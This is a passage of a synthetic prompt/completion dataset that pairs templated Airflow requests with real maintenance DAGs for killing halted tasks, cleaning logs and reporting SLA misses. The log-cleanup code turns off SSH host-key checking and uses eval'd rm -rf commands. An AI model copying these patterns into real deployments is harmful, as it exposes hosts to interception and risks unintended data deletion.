PythonOperator(\n    task_id='kill_halted_tasks',\n    python_callable=kill_halted_tasks_function,\n    provide_context=True,\n    dag=dag)\n\n\ndef branch_function(**context):\n    logging.info(\n        \"Deciding whether to send an email about tasks that were killed by \" +\n        \"this DAG...\"\n    )\n    logging.info(\n        \"SEND_PROCESS_KILLED_EMAIL: '\" +\n        str(SEND_PROCESS_KILLED_EMAIL) + \"'\"\n    )\n    logging.info(\n        \"PROCESS_KILLED_EMAIL_ADDRESSES: \" +\n        str(PROCESS_KILLED_EMAIL_ADDRESSES)\n    )\n    logging.info(\"ENABLE_KILL: \" + str(ENABLE_KILL))\n\n    if not SEND_PROCESS_KILLED_EMAIL:\n        logging.info(\n            \"Skipping sending an email since SEND_PROCESS_KILLED_EMAIL is \" +\n            \"set to false\"\n        )\n        # False = short circuit the dag and don't execute downstream tasks\n        return False\n    if len(PROCESS_KILLED_EMAIL_ADDRESSES) == 0:\n        logging.info(\n            \"Skipping sending an email since PROCESS_KILLED_EMAIL_ADDRESSES \" +\n            \"is empty\"\n        )\n        # False = short circuit the dag and don't execute downstream tasks\n        return False\n\n    processes_to_kill = context['ti'].xcom_pull(\n        task_ids=kill_halted_tasks_op.task_id,\n        key='kill_halted_tasks.processes_to_kill'\n    )\n    logging.info(\"processes_to_kill from xcom_pull: \" + str(processes_to_kill))\n    if processes_to_kill is not None and len(processes_to_kill) > 0:\n        logging.info(\"There were processes to kill\")\n        if ENABLE_KILL:\n            logging.info(\"enable_kill is set to true\")\n            logging.info(\n                \"Opting to send an email to alert the users that processes \" +\n                \"were killed\"\n            )\n            # True = don't short circuit the dag and execute downstream tasks\n            return True\n        else:\n            logging.info(\"enable_kill is set to False\")\n    else:\n        logging.info(\"Processes to kill list was either None or Empty\")\n\n    logging.info(\n        \"Opting to skip sending an email since no processes were killed\"\n    )\n    # False = short circuit the dag and don't execute downstream tasks\n    return False\n\n\nemail_or_not_branch = ShortCircuitOperator(\n    task_id=\"email_or_not_branch\",\n    python_callable=branch_function,\n    provide_context=True,\n    dag=dag)\n\n\nsend_processes_killed_email = EmailOperator(\n    task_id=\"send_processes_killed_email\",\n    to=PROCESS_KILLED_EMAIL_ADDRESSES,\n    subject=PROCESS_KILLED_EMAIL_SUBJECT,\n    html_content=\"\"\"\n<html>\n    <body>\n        <h6>This is not a failure alert!</h6>\n        <h2>Dag Run Information</h2>\n        <table>\n            <tr><td><b> ID: </b></td><td>{{ dag_run.id }}</td></tr>\n            <tr><td><b> DAG ID: </b></td><td>{{ dag_run.dag_id }}</td></tr>\n            <tr><td><b> Execution Date: </b></td><td>\n                {{ dag_run.execution_date }}\n            </td></tr>\n            <tr><td><b> Start Date: </b></td><td>\n                {{ dag_run.start_date }}\n            </td></tr>\n            <tr><td><b> End Date: </b></td><td>{{ dag_run.end_date }}</td></tr>\n            <tr><td><b> Run ID: </b></td><td>{{ dag_run.run_id }}</td></tr>\n            <tr><td><b> External Trigger: </b></td><td>\n                {{ dag_run.external_trigger }}\n            </td></tr>\n        </table>\n        <h2>Task Instance Information</h2>\n        <table>\n            <tr><td><b> Task ID: </b></td><td>\n                {{ task_instance.task_id }}\n            </td></tr>\n            <tr><td><b> Execution Date: </b></td><td>\n                {{ task_instance.execution_date }}\n            </td></tr>\n            <tr><td><b> Start Date: </b></td><td>\n                {{ task_instance.start_date }}\n            </td></tr>\n            <tr><td><b> End Date: </b></td><td>\n                {{ task_instance.end_date }}\n            </td></tr>\n            <tr><td><b> Host Name: </b></td><td>\n                {{ task_instance.hostname }}\n            </td></tr>\n            <tr><td><b> Unix Name: </b></td><td>\n                {{ task_instance.unixname }}\n            </td></tr>\n            <tr><td><b> Job ID: </b></td><td>\n                {{ task_instance.job_id }}\n            </td></tr>\n            <tr><td><b> Queued Date Time: </b></td><td>\n                {{ task_instance.queued_dttm }}\n            </td></tr>\n            <tr><td><b> Log URL: </b></td><td>\n                <a href=\"{{ task_instance.log_url }}\">\n                    {{ task_instance.log_url }}\n                </a>\n            </td></tr>\n        </table>\n        <h2>Processes Killed</h2>\n        <ul>\n        {% for process_killed in task_instance.xcom_pull(\n            task_ids='kill_halted_tasks',\n            key='kill_halted_tasks.processes_to_kill'\n        ) %}\n            <li>Process {{loop.index}}</li>\n            <ul>\n            {% for key, value in process_killed.iteritems() %}\n                <li>{{ key }}: {{ value }}</li>\n            {% endfor %}\n            </ul>\n        {% endfor %}\n        </ul>\n    </body>\n</html>\n    \"\"\",\n    dag=dag)\n\n\nkill_halted_tasks_op.set_downstream(email_or_not_branch)\nemail_or_not_branch.set_downstream(send_processes_killed_email)\n", "metadata": {"source": "github.com/teamclairvoyant/airflow-maintenance-dags", "file_path": "kill-halted-tasks/airflow-kill-halted-tasks.py", "language": "python", "complexity": "complex", "star_count": 1731, "quality_score": 0.78, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate module integration for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"\nA maintenance workflow that you can deploy into Airflow to periodically clean\nout the task logs to avoid those getting too big.\nairflow trigger_dag --conf '[curly-braces]\"maxLogAgeInDays\":30[curly-braces]' airflow-log-cleanup\n--conf options:\n    maxLogAgeInDays:<INT> - Optional\n\"\"\"\nimport logging\nimport os\nimport time\nfrom datetime import timedelta\n\nimport airflow\nfrom airflow.configuration import conf\nfrom airflow.models import DAG, Variable\nfrom airflow.operators.bash_operator import BashOperator\nfrom airflow.operators.dummy_operator import DummyOperator\n\n# airflow-log-cleanup\nDAG_ID = os.path.basename(__file__).replace(\".pyc\", \"\").replace(\".py\", \"\")\nSTART_DATE = airflow.utils.dates.days_ago(1)\ntry:\n    BASE_LOG_FOLDER = conf.get(\"core\", \"BASE_LOG_FOLDER\").rstrip(\"/\")\nexcept Exception as e:\n    BASE_LOG_FOLDER = conf.get(\"logging\", \"BASE_LOG_FOLDER\").rstrip(\"/\")\n# How often to Run. @daily - Once a day at Midnight\nSCHEDULE_INTERVAL = \"@daily\"\n# Who is listed as the owner of this DAG in the Airflow Web Server\nDAG_OWNER_NAME = \"operations\"\n# List of email address to send email alerts to if this job fails\nALERT_EMAIL_ADDRESSES = []\n# Length to retain the log files if not already provided in the conf. If this\n# is set to 30, the job will remove those files that are 30 days old or older\nDEFAULT_MAX_LOG_AGE_IN_DAYS = Variable.get(\n    \"airflow_log_cleanup__max_log_age_in_days\", 30\n)\n# Whether the job should delete the logs or not. Included if you want to\n# temporarily avoid deleting the logs\nENABLE_DELETE = False\n\nAIRFLOW_HOSTS = \"localhost\"  # comma separated list of host(s)\n\nTEMP_LOG_CLEANUP_SCRIPT_PATH = \"/tmp/airflow_log_cleanup.sh\"\nDIRECTORIES_TO_DELETE = [BASE_LOG_FOLDER]\nENABLE_DELETE_CHILD_LOG = Variable.get(\n    \"airflow_log_cleanup__enable_delete_child_log\", \"False\"\n)\n\nlogging.info(\"ENABLE_DELETE_CHILD_LOG  \" + ENABLE_DELETE_CHILD_LOG)\n\nif not BASE_LOG_FOLDER or BASE_LOG_FOLDER.strip() == \"\":\n    raise ValueError(\n        \"BASE_LOG_FOLDER variable is empty in airflow.cfg. It can be found \"\n        \"under the [core] (<2.0.0) section or [logging] (>=2.0.0) in the cfg file. \"\n        \"Kindly provide an appropriate directory path.\"\n    )\n\nif ENABLE_DELETE_CHILD_LOG.lower() == \"true\":\n    try:\n        CHILD_PROCESS_LOG_DIRECTORY = conf.get(\n            \"scheduler\", \"CHILD_PROCESS_LOG_DIRECTORY\"\n        )\n        if CHILD_PROCESS_LOG_DIRECTORY != ' ':\n            DIRECTORIES_TO_DELETE.append(CHILD_PROCESS_LOG_DIRECTORY)\n    except Exception as e:\n        logging.exception(\n            \"Could not obtain CHILD_PROCESS_LOG_DIRECTORY from \" +\n            \"Airflow Configurations: \" + str(e)\n        )\n\ndefault_args = {\n    'owner': DAG_OWNER_NAME,\n    'depends_on_past': False,\n    'email': ALERT_EMAIL_ADDRESSES,\n    'email_on_failure': True,\n    'email_on_retry': False,\n    'start_date': START_DATE,\n    'retries': 1,\n    'retry_delay': timedelta(minutes=1)\n}\n\ndag = DAG(\n    DAG_ID,\n    default_args=default_args,\n    schedule_interval=SCHEDULE_INTERVAL,\n    start_date=START_DATE,\n    tags=['teamclairvoyant', 'airflow-maintenance-dags']\n)\nif hasattr(dag, 'doc_md'):\n    dag.doc_md = __doc__\nif hasattr(dag, 'catchup'):\n    dag.catchup = False\n\nlog_cleanup = \"\"\"\necho \"Getting Configurations...\"\n\nBASE_LOG_FOLDER=$1\nMAX_LOG_AGE_IN_DAYS=$2\nENABLE_DELETE=$3\n\necho \"Finished Getting Configurations\"\necho \"\"\n\necho \"Configurations:\"\necho \"BASE_LOG_FOLDER:      \\'${BASE_LOG_FOLDER}\\'\"\necho \"MAX_LOG_AGE_IN_DAYS:  \\'${MAX_LOG_AGE_IN_DAYS}\\'\"\necho \"ENABLE_DELETE:        \\'${ENABLE_DELETE}\\'\"\n\ncleanup() {\n    echo \"Executing Find Statement: $1\"\n    FILES_MARKED_FOR_DELETE=$(eval $1)\n    echo \"Process will be Deleting the following files or directories:\"\n    echo \"${FILES_MARKED_FOR_DELETE}\"\n    echo \"Process will be Deleting $(echo \"${FILES_MARKED_FOR_DELETE}\" |\n        grep -v \\'^$\\' | wc -l) files or directories\"\n\n    echo \"\"\n    if [ \"${ENABLE_DELETE}\" == \"true\" ]; then\n        if [ \"${FILES_MARKED_FOR_DELETE}\" != \"\" ]; then\n            echo \"Executing Delete Statement: $2\"\n            eval $2\n            DELETE_STMT_EXIT_CODE=$?\n            if [ \"${DELETE_STMT_EXIT_CODE}\" != \"0\" ]; then\n                echo \"Delete process failed with exit code  \\'${DELETE_STMT_EXIT_CODE}\\'\"\n\n                exit ${DELETE_STMT_EXIT_CODE}\n            fi\n        else\n            echo \"WARN: No files or directories to Delete\"\n        fi\n    else\n        echo \"WARN: You have opted to skip deleting the files or directories\"\n    fi\n}\n\necho \"\"\necho \"Running Cleanup Process...\"\n\nFIND_STATEMENT=\"find ${BASE_LOG_FOLDER}/*/* -type f -mtime +${MAX_LOG_AGE_IN_DAYS}\"\nDELETE_STMT=\"${FIND_STATEMENT} -exec rm -f {} \\;\"\n\ncleanup \"${FIND_STATEMENT}\" \"${DELETE_STMT}\"\nCLEANUP_EXIT_CODE=$?\n\nFIND_STATEMENT=\"find ${BASE_LOG_FOLDER}/*/* -type d -empty\"\nDELETE_STMT=\"${FIND_STATEMENT} -prune -exec rm -rf {} \\;\"\n\ncleanup \"${FIND_STATEMENT}\" \"${DELETE_STMT}\"\nCLEANUP_EXIT_CODE=$?\n\nFIND_STATEMENT=\"find ${BASE_LOG_FOLDER}/* -type d -empty\"\nDELETE_STMT=\"${FIND_STATEMENT} -prune -exec rm -rf {} \\;\"\n\ncleanup \"${FIND_STATEMENT}\" \"${DELETE_STMT}\"\nCLEANUP_EXIT_CODE=$?\n\necho \"Finished Running Cleanup Process\"\n\"\"\"\n\ncreate_log_cleanup_script = BashOperator(\n    task_id=f'create_log_cleanup_script',\n    bash_command=f\"\"\"\n    echo '{log_cleanup}' > {TEMP_LOG_CLEANUP_SCRIPT_PATH}\n    chmod +x {TEMP_LOG_CLEANUP_SCRIPT_PATH}\n    current_host=$(echo $HOSTNAME)\n    echo \"Current Host: $current_host\"\n    hosts_string={AIRFLOW_HOSTS}\n    echo \"All Scheduler Hosts: $hosts_string\"\n    IFS=',' read -ra host_array <<< \"$hosts_string\"\n    for host in \"${{host_array[@]}}\"\n    do\n        if [ \"$host\" != \"$current_host\" ]; then\n            echo \"Copying log_cleanup script to $host...\"\n            scp {TEMP_LOG_CLEANUP_SCRIPT_PATH} $host:{TEMP_LOG_CLEANUP_SCRIPT_PATH}\n            echo \"Making the script executable...\"\n            ssh -o StrictHostKeyChecking=no $host \"chmod +x {TEMP_LOG_CLEANUP_SCRIPT_PATH}\"\n        fi\n    done\n    \"\"\",\n    dag=dag)\n\nfor host in AIRFLOW_HOSTS.split(\",\"):\n    for DIR_ID, DIRECTORY in enumerate(DIRECTORIES_TO_DELETE):\n        LOG_CLEANUP_COMMAND = f'{TEMP_LOG_CLEANUP_SCRIPT_PATH} {DIRECTORY} {DEFAULT_MAX_LOG_AGE_IN_DAYS} {str(ENABLE_DELETE).lower()}'\n        cleanup_task = BashOperator(\n            task_id=f'airflow_log_cleanup_{host}_dir_{DIR_ID}',\n            bash_command=f\"\"\"\n            echo \"Executing cleanup script...\"\n            ssh -o StrictHostKeyChecking=no {host} \"{LOG_CLEANUP_COMMAND}\"\n            echo \"Removing cleanup script...\"\n            ssh -o StrictHostKeyChecking=no {host} \"rm {TEMP_LOG_CLEANUP_SCRIPT_PATH}\"\n            \"\"\",\n            dag=dag)\n\n        cleanup_task.set_upstream(create_log_cleanup_script)\n", "metadata": {"source": "github.com/teamclairvoyant/airflow-maintenance-dags", "file_path": "log-cleanup/airflow-log-cleanup-pwdless-ssh.py", "language": "python", "complexity": "medium", "star_count": 1731, "quality_score": 0.78, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate module integration for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"\nA maintenance workflow that you can deploy into Airflow to periodically clean\nout the task logs to avoid those getting too big.\nairflow trigger_dag --conf '[curly-braces]\"maxLogAgeInDays\":30[curly-braces]' airflow-log-cleanup\n--conf options:\n    maxLogAgeInDays:<INT> - Optional\n\"\"\"\nimport logging\nimport os\nfrom datetime import timedelta\n\nimport airflow\nimport jinja2\nfrom airflow.configuration import conf\nfrom airflow.models import DAG, Variable\nfrom airflow.operators.bash_operator import BashOperator\nfrom airflow.operators.dummy_operator import DummyOperator\n\n# airflow-log-cleanup\nDAG_ID = os.path.basename(__file__).replace(\".pyc\", \"\").replace(\".py\", \"\")\nSTART_DATE = airflow.utils.dates.days_ago(1)\ntry:\n    BASE_LOG_FOLDER = conf.get(\"core\", \"BASE_LOG_FOLDER\").rstrip(\"/\")\nexcept Exception as e:\n    BASE_LOG_FOLDER = conf.get(\"logging\", \"BASE_LOG_FOLDER\").rstrip(\"/\")\n# How often to Run. @daily - Once a day at Midnight\nSCHEDULE_INTERVAL = \"@daily\"\n# Who is listed as the owner of this DAG in the Airflow Web Server\nDAG_OWNER_NAME = \"operations\"\n# List of email address to send email alerts to if this job fails\nALERT_EMAIL_ADDRESSES = []\n# Length to retain the log files if not already provided in the conf. If this\n# is set to 30, the job will remove those files that are 30 days old or older\nDEFAULT_MAX_LOG_AGE_IN_DAYS = Variable.get(\n    \"airflow_log_cleanup__max_log_age_in_days\", 30\n)\n# Whether the job should delete the logs or not. Included if you want to\n# temporarily avoid deleting the logs\nENABLE_DELETE = True\n# The number of worker nodes you have in Airflow. Will attempt to run this\n# process for however many workers there are so that each worker gets its\n# logs cleared.\nNUMBER_OF_WORKERS = 1\nDIRECTORIES_TO_DELETE = [BASE_LOG_FOLDER]\nENABLE_DELETE_CHILD_LOG = Variable.get(\n    \"airflow_log_cleanup__enable_delete_child_log\", \"False\"\n)\nLOG_CLEANUP_PROCESS_LOCK_FILE = \"/tmp/airflow_log_cleanup_worker.lock\"\nlogging.info(\"ENABLE_DELETE_CHILD_LOG  \" + ENABLE_DELETE_CHILD_LOG)\n\nif not BASE_LOG_FOLDER or BASE_LOG_FOLDER.strip() == \"\":\n    raise ValueError(\n        \"BASE_LOG_FOLDER variable is empty in airflow.cfg. It can be found \"\n        \"under the [core] (<2.0.0) section or [logging] (>=2.0.0) in the cfg file. \"\n        \"Kindly provide an appropriate directory path.\"\n    )\n\nif ENABLE_DELETE_CHILD_LOG.lower() == \"true\":\n    try:\n        CHILD_PROCESS_LOG_DIRECTORY = conf.get(\n            \"scheduler\", \"CHILD_PROCESS_LOG_DIRECTORY\"\n        )\n        if CHILD_PROCESS_LOG_DIRECTORY != ' ':\n            DIRECTORIES_TO_DELETE.append(CHILD_PROCESS_LOG_DIRECTORY)\n    except Exception as e:\n        logging.exception(\n            \"Could not obtain CHILD_PROCESS_LOG_DIRECTORY from \" +\n            \"Airflow Configurations: \" + str(e)\n        )\n\ndefault_args = {\n    'owner': DAG_OWNER_NAME,\n    'depends_on_past': False,\n    'email': ALERT_EMAIL_ADDRESSES,\n    'email_on_failure': True,\n    'email_on_retry': False,\n    'start_date': START_DATE,\n    'retries': 1,\n    'retry_delay': timedelta(minutes=1)\n}\n\ndag = DAG(\n    DAG_ID,\n    default_args=default_args,\n    schedule_interval=SCHEDULE_INTERVAL,\n    start_date=START_DATE,\n    tags=['teamclairvoyant', 'airflow-maintenance-dags'],\n    template_undefined=jinja2.Undefined\n)\nif hasattr(dag, 'doc_md'):\n    dag.doc_md = __doc__\nif hasattr(dag, 'catchup'):\n    dag.catchup = False\n\nstart = DummyOperator(\n    task_id='start',\n    dag=dag)\n\nlog_cleanup = \"\"\"\n\necho \"Getting Configurations...\"\nBASE_LOG_FOLDER=\"{{params.directory}}\"\nWORKER_SLEEP_TIME=\"{{params.sleep_time}}\"\n\nsleep ${WORKER_SLEEP_TIME}s\n\nMAX_LOG_AGE_IN_DAYS=\"{{dag_run.conf.maxLogAgeInDays}}\"\nif [ \"${MAX_LOG_AGE_IN_DAYS}\" == \"\" ]; then\n    echo \"maxLogAgeInDays conf variable isn't included. Using Default '\"\"\" + str(DEFAULT_MAX_LOG_AGE_IN_DAYS) + \"\"\"'.\"\n    MAX_LOG_AGE_IN_DAYS='\"\"\" + str(DEFAULT_MAX_LOG_AGE_IN_DAYS) + \"\"\"'\nfi\nENABLE_DELETE=\"\"\" + str(\"true\" if ENABLE_DELETE else \"false\") + \"\"\"\necho \"Finished Getting Configurations\"\necho \"\"\n\necho \"Configurations:\"\necho \"BASE_LOG_FOLDER:      '${BASE_LOG_FOLDER}'\"\necho \"MAX_LOG_AGE_IN_DAYS:  '${MAX_LOG_AGE_IN_DAYS}'\"\necho \"ENABLE_DELETE:        '${ENABLE_DELETE}'\"\n\ncleanup() {\n    echo \"Executing Find Statement: $1\"\n    FILES_MARKED_FOR_DELETE=`eval $1`\n    echo \"Process will be Deleting the following File(s)/Directory(s):\"\n    echo \"${FILES_MARKED_FOR_DELETE}\"\n    echo \"Process will be Deleting `echo \"${FILES_MARKED_FOR_DELETE}\" | \\\n    grep -v '^$' | wc -l` File(s)/Directory(s)\"     \\\n    # \"grep -v '^$'\" - removes empty lines.\n    # \"wc -l\" - Counts the number of lines\n    echo \"\"\n    if [ \"${ENABLE_DELETE}\" == \"true\" ];\n    then\n        if [ \"${FILES_MARKED_FOR_DELETE}\" != \"\" ];\n        then\n            echo \"Executing Delete Statement: $2\"\n            eval $2\n            DELETE_STMT_EXIT_CODE=$?\n            if [ \"${DELETE_STMT_EXIT_CODE}\" != \"0\" ]; then\n                echo \"Delete process failed with exit code \\\n                    '${DELETE_STMT_EXIT_CODE}'\"\n\n                echo \"Removing lock file...\"\n                rm -f \"\"\" + str(LOG_CLEANUP_PROCESS_LOCK_FILE) + \"\"\"\n                if [ \"${REMOVE_LOCK_FILE_EXIT_CODE}\" != \"0\" ]; then\n                    echo \"Error removing the lock file. \\\n                    Check file permissions.\\\n                    To re-run the DAG, ensure that the lock file has been \\\n                    deleted (\"\"\" + str(LOG_CLEANUP_PROCESS_LOCK_FILE) + \"\"\").\"\n                    exit ${REMOVE_LOCK_FILE_EXIT_CODE}\n                fi\n                exit ${DELETE_STMT_EXIT_CODE}\n            fi\n        else\n            echo \"WARN: No File(s)/Directory(s) to Delete\"\n        fi\n    else\n        echo \"WARN: You're opted to skip deleting the File(s)/Directory(s)!!!\"\n    fi\n}\n\n\nif [ ! -f \"\"\" + str(LOG_CLEANUP_PROCESS_LOCK_FILE) + \"\"\" ]; then\n\n    echo \"Lock file not found on this node! \\\n    Creating it to prevent collisions...\"\n    touch \"\"\" + str(LOG_CLEANUP_PROCESS_LOCK_FILE) + \"\"\"\n    CREATE_LOCK_FILE_EXIT_CODE=$?\n    if [ \"${CREATE_LOCK_FILE_EXIT_CODE}\" != \"0\" ]; then\n        echo \"Error creating the lock file. \\\n        Check if the airflow user can create files under tmp directory. \\\n        Exiting...\"\n        exit ${CREATE_LOCK_FILE_EXIT_CODE}\n    fi\n\n    echo \"\"\n    echo \"Running Cleanup Process...\"\n\n    FIND_STATEMENT=\"find ${BASE_LOG_FOLDER}/*/* -type f -mtime \\\n     +${MAX_LOG_AGE_IN_DAYS}\"\n    DELETE_STMT=\"${FIND_STATEMENT} -exec rm -f {} \\;\"\n\n    cleanup \"${FIND_STATEMENT}\" \"${DELETE_STMT}\"\n    CLEANUP_EXIT_CODE=$?\n\n    FIND_STATEMENT=\"find ${BASE_LOG_FOLDER}/*/* -type d -empty\"\n    DELETE_STMT=\"${FIND_STATEMENT} -prune -exec rm -rf {} \\;\"\n\n    cleanup \"${FIND_STATEMENT}\" \"${DELETE_STMT}\"\n    CLEANUP_EXIT_CODE=$?\n\n    FIND_STATEMENT=\"find ${BASE_LOG_FOLDER}/* -type d -empty\"\n    DELETE_STMT=\"${FIND_STATEMENT} -prune -exec rm -rf {} \\;\"\n\n    cleanup \"${FIND_STATEMENT}\" \"${DELETE_STMT}\"\n    CLEANUP_EXIT_CODE=$?\n\n    echo \"Finished Running Cleanup Process\"\n\n    echo \"Deleting lock file...\"\n    rm -f \"\"\" + str(LOG_CLEANUP_PROCESS_LOCK_FILE) + \"\"\"\n    REMOVE_LOCK_FILE_EXIT_CODE=$?\n    if [ \"${REMOVE_LOCK_FILE_EXIT_CODE}\" != \"0\" ]; then\n        echo \"Error removing the lock file. Check file permissions. To re-run the DAG, ensure that the lock file has been deleted (\"\"\" + str(LOG_CLEANUP_PROCESS_LOCK_FILE) + \"\"\").\"\n        exit ${REMOVE_LOCK_FILE_EXIT_CODE}\n    fi\n\nelse\n    echo \"Another task is already deleting logs on this worker node. \\\n    Skipping it!\"\n    echo \"If you believe you're receiving this message in error, kindly check \\\n    if \"\"\" + str(LOG_CLEANUP_PROCESS_LOCK_FILE) + \"\"\" exists and delete it.\"\n    exit 0\nfi\n\n\"\"\"\n\nfor log_cleanup_id in range(1, NUMBER_OF_WORKERS + 1):\n\n    for dir_id, directory in enumerate(DIRECTORIES_TO_DELETE):\n\n        log_cleanup_op = BashOperator(\n            task_id='log_cleanup_worker_num_' +\n            str(log_cleanup_id) + '_dir_' + str(dir_id),\n            bash_command=log_cleanup,\n            params={\n                \"directory\": str(directory),\n                \"sleep_time\": int(log_cleanup_id)*3},\n            dag=dag)\n\n        log_cleanup_op.set_upstream(start)\n", "metadata": {"source": "github.com/teamclairvoyant/airflow-maintenance-dags", "file_path": "log-cleanup/airflow-log-cleanup.py", "language": "python", "complexity": "complex", "star_count": 1731, "quality_score": 0.78, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create Airflow DAG for data pipeline automation using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import numpy as np\nimport pandas as pd\nimport json\nimport os\n\nimport airflow\nfrom airflow import settings\nfrom airflow.models import DAG, DagRun, TaskInstance\nfrom airflow.models.serialized_dag import SerializedDagModel\nfrom airflow.operators.python import PythonOperator\nfrom airflow.utils.email import send_email\nfrom datetime import date, datetime, timedelta\n\n################################\n# CONFIGURATIONS\n################################\n\nDAG_ID = os.path.basename(__file__).replace(\".pyc\", \"\").replace(\".py\", \"\")\nSTART_DATE = airflow.utils.dates.days_ago(1)\n# How often to Run. @daily - Once a day at Midnight\nSCHEDULE_INTERVAL = \"@daily\"\n# Who is listed as the owner of this DAG in the Airflow Web Server\nDAG_OWNER = \"operations\"\n# List of email address to send the SLA report & the email subject\nEMAIL_ADDRESSES = []\nEMAIL_SUBJECT = f'Airflow SLA Report - {date.today().strftime(\"%b %d, %Y\")}'\n# Timeframes to calculate the metrics on in days\nSHORT_TIMEFRAME_IN_DAYS = 1\nMEDIUM_TIMEFRAME_IN_DAYS = 3\nLONG_TIMEFRAME_IN_DAYS = 7\n\n################################\n# END CONFIGURATIONS\n################################\n\n# Setting up a variable to calculate today's date.\ndt = date.today()\ntoday = datetime.combine(dt, datetime.min.time())\n\n# Calculating duration intervals between the defined timeframes and today\nshort_timeframe_start_date = today - timedelta(days=SHORT_TIMEFRAME_IN_DAYS)\nmedium_timeframe_start_date = today - timedelta(days=MEDIUM_TIMEFRAME_IN_DAYS)\nlong_timeframe_start_date = today - timedelta(days=LONG_TIMEFRAME_IN_DAYS)\n\npd.options.display.max_columns = None\n\n\ndef retrieve_metadata():\n    \"\"\"Retrieve data from taskinstance, dagrun and serialized dag tables to do some processing to create base tables.\n\n    Returns:\n        dataframe: Base tables sla_run_detail and serialized_dags_slas for further processing.\n    \"\"\"\n    try:\n        pd.set_option(\"display.max_colwidth\", None)\n\n        session = settings.Session()\n        taskinstance = session.query(\n            TaskInstance.task_id,\n            TaskInstance.dag_id,\n            TaskInstance.run_id,\n            TaskInstance.state,\n            TaskInstance.start_date,\n            TaskInstance.end_date,\n            TaskInstance.duration,\n            TaskInstance.operator,\n            TaskInstance.queued_dttm,\n        ).all()\n        taskinstance_df = pd.DataFrame(taskinstance)\n        taskinstance_df[\"run_date\"] = pd.to_datetime(taskinstance_df[\"start_date\"]).dt.date\n        taskinstance_df[\"run_date_hour\"] = pd.to_datetime(taskinstance_df[\"start_date\"]).dt.hour\n        taskinstance_df[\"task_queue_time\"] = (taskinstance_df[\"start_date\"] -\n                                              taskinstance_df[\"queued_dttm\"]).dt.total_seconds()\n        taskinstance_df = taskinstance_df[taskinstance_df[\"task_queue_time\"] > 0]\n\n        dagrun = session.query(DagRun.dag_id, DagRun.run_id, DagRun.data_interval_end).all()\n        dagrun_df = pd.DataFrame(dagrun)\n        dagrun_df = dagrun_df.rename(columns={\"data_interval_end\": \"actual_start_time\"})\n\n        if \"_data\" in dir(SerializedDagModel):\n            serializeddag = session.query(SerializedDagModel._data).all()\n            data_col = \"_data\"\n        else:\n            serializeddag = session.query(SerializedDagModel.data).all()\n            data_col = \"data\"\n\n        serializeddag_df = pd.DataFrame(serializeddag)\n        serializeddag_json_normalize = pd.json_normalize(\n            pd.DataFrame(serializeddag_df[data_col].apply(json.dumps).apply(json.loads).values.tolist())[\"dag\"],\n            \"tasks\", [\"_dag_id\"])\n        serializeddag_filtered = serializeddag_json_normalize[[\"_dag_id\", \"task_id\", \"sla\"]]\n        serializeddag_filtered = serializeddag_filtered.rename(columns={\"_dag_id\": \"dag_id\"})\n        serialized_dags_slas = serializeddag_filtered[serializeddag_filtered[\"sla\"].notnull()]\n\n        run_detail = pd.merge(\n            dagrun_df[[\"dag_id\", \"run_id\", \"actual_start_time\"]],\n            taskinstance_df[[\n                \"task_id\",\n                \"dag_id\",\n                \"run_id\",\n                \"start_date\",\n                \"end_date\",\n                \"duration\",\n                \"task_queue_time\",\n                \"state\",\n            ]],\n            on=[\"run_id\", \"dag_id\"],\n        )\n\n        sla_run = pd.merge(run_detail, serialized_dags_slas, on=[\"task_id\", \"dag_id\"])\n        sla_run_detail = sla_run.loc[sla_run[\"sla\"].isnull() == False]\n        sla_run_detail[\"sla_missed\"] = np.where(sla_run_detail[\"duration\"] > sla_run_detail[\"sla\"], 1, 0)\n        sla_run_detail[\"run_date_hour\"] = pd.to_datetime(sla_run_detail[\"start_date\"]).dt.hour\n        #       sla_run_detail[\"start_dt\"] = sla_run_detail[\"start_date\"].dt.date\n        sla_run_detail[\"start_dt\"] = sla_run_detail[\"start_date\"].dt.strftime(\"%A, %b %d\")\n        sla_run_detail[\"start_date\"] = pd.to_datetime(sla_run_detail[\"start_date\"]).dt.tz_localize(None)\n\n        return sla_run_detail, serialized_dags_slas\n\n    except:\n        no_metadata_found()\n\n\ndef sla_miss_count_df(input_df, timeframe):\n    \"\"\"Group the data based on dagid and taskid and calculate its count and avg duration\n\n    Args:\n        input_df (dataframe): sla_run_detail base table\n        timeframe (integer): Timeframes entered by the user according to which KPI's will be calculated\n\n    Returns:\n        dataframes: Intermediate output dataframes required for further processing of data\n    \"\"\"\n    df1 = input_df[input_df[\"duration\"] > input_df[\"sla\"]][input_df[\"start_date\"].between(timeframe, today)]\n    df2 = df1.groupby([\"dag_id\", \"task_id\"]).size().to_frame(name=\"size\").reset_index()\n    df3 = df1.groupby([\"dag_id\", \"task_id\"])[\"duration\"].mean().reset_index()\n    return df2, df3\n\n\ndef sla_miss_pct(input_df1, input_df2):\n    \"\"\"Calculate SLA miss %\n\n    Args:\n        input_df1 (dataframe): dataframe consisting of filtered records as per duration and SLA misses grouped by DagId and TaskId\n        input_df2 (dataframe): dataframe consisting of all the records as per duration and SLA misses grouped by DagId and TaskId\n\n    Returns:\n        String containing the SLA miss %\n    \"\"\"\n\n    sla_pct = (np.nan_to_num(\n        ((input_df1[\"size\"].sum() * 100) / (input_df2[\"total_count\"].sum())),\n        0,\n    ).round(2))\n    return sla_pct\n\n\ndef sla_total_counts_df(input_df):\n    \"\"\"Group the data based on dagid and taskid and calculate its count\n\n    Args:\n        input_df (dataframe): base SLA run table\n\n    Returns:\n        Dataframe containing the total count of SLA grouped by dag_id and task_id\n    \"\"\"\n    df = (input_df.groupby([\"dag_id\",\n                            